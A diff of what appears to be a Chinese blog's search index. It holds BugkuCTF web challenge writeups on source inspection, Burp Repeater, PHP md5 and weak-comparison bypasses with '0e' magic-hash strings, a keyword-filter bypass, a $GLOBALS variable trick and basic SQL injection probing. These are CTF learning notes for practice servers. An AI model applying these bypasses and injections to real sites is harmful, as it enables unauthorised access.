+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8002/web5/">http://123.206.87.240:8002/web5/</a><br><img src="https://img-blog.csdnimg.cn/20190706131449616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接后,得到一个对话框<br><img src="https://img-blog.csdnimg.cn/20190706131525541.png" alt="在这里插入图片描述"><br>随便输<br><img src="https://img-blog.csdnimg.cn/20190706131616839.png" alt="在这里插入图片描述"><br>没啥可用的东西，查看源码，得到超长编码，由于编码太长，这里我就不把它粘贴出来了，这是JS的jother编码，大多数浏览器的控制台都能直接解析它，只需要将编码复制到Console中，敲Enter即可<br>例如：Chrome浏览器<br><img src="https://img-blog.csdnimg.cn/20190706133047889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Firefox浏览器<br><img src="https://img-blog.csdnimg.cn/20190706133324451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到的flag提交以下发现并不对<br><img src="https://img-blog.csdnimg.cn/20190706133425291.png" alt="在这里插入图片描述"><br>看一下题目描述，发现提示<code>字母大写</code>。。。<br>再提交一次<code>CTF&#123;WHATFK&#125;</code><br><img src="https://img-blog.csdnimg.cn/2019070613354248.png" alt="在这里插入图片描述"><br>那这个就是flag啦，恭喜。</p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-web3 writeup</title>
+    <url>/2019/3PRWKP8/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629165133843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接后一直有弹窗，禁止使用即可，也可以直接在URL前加<code>view-source:</code><br>查看源代码，拖到最后发现<br><img src="https://img-blog.csdnimg.cn/20190629165308435.png" alt="在这里插入图片描述"><br>最后一串编码为<code>Unicode编码转换ASCII</code>，用<a href="http://tool.chinaz.com/tools/unicode.aspx">站长工具</a>即可完成转换</p>
+<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190629165515214.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-web基础$_POST writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++个人收获：学会POST传参<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++                                  </p>
+    <url>/2019/S8F3QN/</url>
+    <content><![CDATA[<blockquote>
+<p>学会POST传参                                                                                   </p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629163653290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，由题目可知及代码可知，该题是让我们用POST方式提交参数<br>打开火狐，用hackbar提交即可（右侧）点击RUN提交即可<br><img src="https://img-blog.csdnimg.cn/2019062916385620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/2019062916395998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -217,13 +241,18 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-你必须让他停下 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++个人收获：运气、耐心。。。<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/1RT4H8Z/</url>
+    <content><![CDATA[<blockquote>
+<p>运气、耐心</p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190630170610419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接后，页面一直自动刷新，直接bp抓包<br><img src="https://img-blog.csdnimg.cn/20190630170704570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发送到Repeater里，每go一下，发现图片都会变化，这个是随机的，所以多go几次当出现<code>10.jpg</code>时flag就出来了，好像有时候出现<code>10.jpg</code>也没有flag，多go几次就行</p>
 <h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190630170929375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -231,13 +260,15 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-前女友 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目传送门：<a href="http://123.206.31.85:49162/">http://123.206.31.85:49162/</a><br><img src="https://img-blog.csdnimg.cn/20190713131216207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <url>/2019/RQZRRY/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目传送门：<a href="http://123.206.31.85:49162/">http://123.206.31.85:49162/</a><br><img src="https://img-blog.csdnimg.cn/20190713131216207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接一大段文字，，，没什么有用的，，嗯，PHP是世界上最好的语言<br><img src="https://img-blog.csdnimg.cn/2019071313165768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>老套路，先看看源码再说<br><img src="https://img-blog.csdnimg.cn/20190713131357770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不看源码还真是看不出来这有个链接，打开这个隐蔽链接后得到：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;<span class="comment">//v1与v2的值要不一样，但是他们经过md5加密后又一样</span></span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;<span class="comment">//strcmp() 函数比较两个字符串（区分大小写），相同则返回0</span></span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <ul>
@@ -249,13 +280,18 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-变量1 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：PHP <code>echo(var_dump(&quot;$GLOBALS&quot;););</code>//以数组方式输出超全局变量数组内的所有元素<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/2QBZR9A/</url>
+    <content><![CDATA[<blockquote>
+<p>PHP <code>echo(var_dump(&quot;$GLOBALS&quot;););</code>//以数组方式输出超全局变量数组内的所有元素</p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8004/index1.php">http://123.206.87.240:8004/index1.php</a><br><img src="https://img-blog.csdnimg.cn/20190706122459203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接得到</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;<span class="comment">///^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);<span class="comment">//var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -271,13 +307,65 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-备份是个好习惯 writeup</title>
+    <url>/2019/3HFNCNC/</url>
+    <content><![CDATA[<blockquote>
+<p>常用备份文件后缀：<code>*.swp，*.bak</code><br>md5函数漏洞<br>php弱判断</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目传送门：<a href="http://123.206.87.240:8002/web16/">http://123.206.87.240:8002/web16/</a><br><img src="https://img-blog.csdnimg.cn/20190711220141739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接得到的一串暂时看不懂的编码。。。<br><img src="https://img-blog.csdnimg.cn/20190711220258278.png" alt="在这里插入图片描述"><br>小白什么都不懂，直接御剑扫描吧<br><img src="https://img-blog.csdnimg.cn/20190711221646935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看大佬的wp是用源码泄露工具搞到的备份文件，以后可能会补上此方法<br>备份地址：<a href="http://123.206.87.240:8002/web16/index.php.bak">http://123.206.87.240:8002/web16/index.php.bak</a><br>下载文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);<span class="comment">//str=URL?后面内容</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);<span class="comment">//从第一个开始</span></span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);<span class="comment">//把字符串中的key全部换成空格</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码知识点：<br><code>strstr() 函数</code> strstr(string,search,before_search) 搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE(区分大小写)，<code>stristr() 函数</code>，这个不区分;<br><code>substr() 函数</code> substr(string,start,length) 返回字符串的一部分;<br><code>str_replace() 函数</code>str_replace(find,replace,string,count)<br>替 换字符串中的一些字符（区分大小写）。<br><code>parse_str() 函数</code>      parse_str(string,array) 把查询字符串解析到变量中</p>
+<p>所以，整段代码的意思就是j截取URL<code>?</code>后的参数，并把gat到的变量中所有<code>key</code>替换为空格，不过这里我们可以用kkeyey绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</span><br></pre></td></tr></table></figure>
+<p>但是通过这段代码可以知道，我们传进去的变量，它们的md5值要相同，但它们本身却有不同，这里我们又要用到一个小知识点：</p>
+<p>法一、md5()函数是无法处理数组的，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p>
+<p>所以将key1，key2写成数组，内容再不一样就行啦</p>
+<p>法二、利用==弱比较漏洞<br>科学计数法为*e**<em>，如果两个字符串解密后是0e**</em>那么他们两个就相等啦<br>下面几个都是开头为0e的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>法一、构造Payload<br><img src="https://img-blog.csdnimg.cn/20190711230722660.png" alt="在这里插入图片描述"><br>法二、构造Payload<br><img src="https://img-blog.csdnimg.cn/2019071123080461.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-头等舱 writeup</title>
+    <url>/2019/11FQE8K/</url>
+    <content><![CDATA[<blockquote>
+<p>小白你的脑洞呢！！！</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:9009/hd.php">http://123.206.87.240:9009/hd.php</a><br><img src="https://img-blog.csdnimg.cn/20190706134222359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，什么都没有，真的是什么都没有<br><img src="https://img-blog.csdnimg.cn/20190706134300261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码也是什么也没有<br><img src="https://img-blog.csdnimg.cn/2019070613433574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那就抓包看看<br><img src="https://img-blog.csdnimg.cn/2019070613442627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也没有，emm<br>再回去看看题目，头等舱，头等舱，头等舱，响应头？？？！！！<br>放到Repeater里面，Go以下，Response里面已经出来flag了</p>
+<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190706134700864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-成绩单 WP</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：最基本的SQL注入<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/1XPHEJF/</url>
+    <content><![CDATA[<blockquote>
+<p>最基本的SQL注入</p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题传送门：<a href="http://123.206.87.240:8002/chengjidan/">http://123.206.87.240:8002/chengjidan/</a><br><img src="https://img-blog.csdnimg.cn/20190712114629614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>查看源码可以知道，name为id，且为post传参<br><img src="https://img-blog.csdnimg.cn/20190712120659342.png" alt="在这里插入图片描述"><br>用火狐的hackbar，查几个试试，试了一下，只有三个数据<br><img src="https://img-blog.csdnimg.cn/20190712120833652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么，id后面加个<code>&#39;</code>看看<br><img src="https://img-blog.csdnimg.cn/20190712120934791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>报错了，哪加个<code>&#39;#</code>呢，又恢复正常了<br><img src="https://img-blog.csdnimg.cn/20190712121104208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>SQL注入，稳了，两种解法</p>
 <ul>
@@ -302,80 +390,18 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-备份是个好习惯 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：常用备份文件后缀：<code>*.swp，*.bak</code><br>                  md5函数漏洞<br>                  php弱判断<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目传送门：<a href="http://123.206.87.240:8002/web16/">http://123.206.87.240:8002/web16/</a><br><img src="https://img-blog.csdnimg.cn/20190711220141739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接得到的一串暂时看不懂的编码。。。<br><img src="https://img-blog.csdnimg.cn/20190711220258278.png" alt="在这里插入图片描述"><br>小白什么都不懂，直接御剑扫描吧<br><img src="https://img-blog.csdnimg.cn/20190711221646935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看大佬的wp是用源码泄露工具搞到的备份文件，以后可能会补上此方法<br>备份地址：<a href="http://123.206.87.240:8002/web16/index.php.bak">http://123.206.87.240:8002/web16/index.php.bak</a><br>下载文件，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);<span class="comment">//str=URL?后面内容</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);<span class="comment">//从第一个开始</span></span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);<span class="comment">//把字符串中的key全部换成空格</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>代码知识点：<br><code>strstr() 函数</code> strstr(string,search,before_search) 搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE(区分大小写)，<code>stristr() 函数</code>，这个不区分;<br><code>substr() 函数</code> substr(string,start,length) 返回字符串的一部分;<br><code>str_replace() 函数</code>str_replace(find,replace,string,count)<br>替 换字符串中的一些字符（区分大小写）。<br><code>parse_str() 函数</code>      parse_str(string,array) 把查询字符串解析到变量中</p>
-<p>所以，整段代码的意思就是j截取URL<code>?</code>后的参数，并把gat到的变量中所有<code>key</code>替换为空格，不过这里我们可以用kkeyey绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</span><br></pre></td></tr></table></figure>
-<p>但是通过这段代码可以知道，我们传进去的变量，它们的md5值要相同，但它们本身却有不同，这里我们又要用到一个小知识点：</p>
-<p>法一、md5()函数是无法处理数组的，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p>
-<p>所以将key1，key2写成数组，内容再不一样就行啦</p>
-<p>法二、利用==弱比较漏洞<br>科学计数法为*e**<em>，如果两个字符串解密后是0e**</em>那么他们两个就相等啦<br>下面几个都是开头为0e的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>法一、构造Payload<br><img src="https://img-blog.csdnimg.cn/20190711230722660.png" alt="在这里插入图片描述"><br>法二、构造Payload<br><img src="https://img-blog.csdnimg.cn/2019071123080461.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-头等舱 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
